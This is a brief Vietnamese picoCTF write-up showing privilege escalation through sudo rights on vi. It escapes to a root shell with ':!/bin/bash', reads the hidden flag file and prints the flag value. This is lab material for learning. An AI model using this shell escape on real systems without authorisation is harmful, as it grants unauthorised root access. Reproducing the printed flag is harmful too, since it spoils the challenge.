# Write Up

Sử dụng lệnh `sudo -l` để xem mình có quyền sudo ở những đâu

```bash
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Có quyền trong `vim` nên chúng ta sẽ vào vim và nhập lệnh sau

```bash
$ sudo /usr/bin/vi
```

Lệnh: `:!/bin/bash`

Sau đó chúng ta sẽ vào được root để đọc flag

```bash
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```
